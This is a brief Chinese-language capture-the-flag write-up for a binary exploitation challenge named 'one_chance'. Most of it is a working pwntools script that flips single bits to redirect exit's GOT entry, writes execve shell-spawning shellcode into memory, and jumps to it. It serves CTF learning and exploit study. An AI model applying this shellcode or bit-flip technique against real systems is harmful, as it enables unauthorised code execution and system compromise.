## 考点

单字节构造rop+栈溢出

## 工具

python3

## 步骤

```python
#!/usr/bin/env python3

from pwn import *

context.log_level='debug'
#r = remote('10.212.27.23', 12138)
r = process("./one_chance")
# r.recvuntil("token: ")
gdb.attach(r,"b *40127C")
sleep(1)
def flip(addr, bit):
    r.recvuntil('slip?')
    r.sendline(hex(addr) + ' ' + str(bit))

target = 0x401286

flip(target + 1, 6)

shellcode_start = 0x4010C0
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
e = ELF('./one_chance')
for i in range(len(shellcode)):
    b = shellcode[i] ^ e.read(shellcode_start + i, 1)[0]
    for j in range(8):
        if (b >> j) & 1:
            flip(shellcode_start + i, j)

flip(target + 1, 6)

r.interactive()

```

## 总结

修改exit的got表1个bit，使程序流在main函数中产生循环，可以达到任意地址写的效果，然后写shellcode进行跳转。
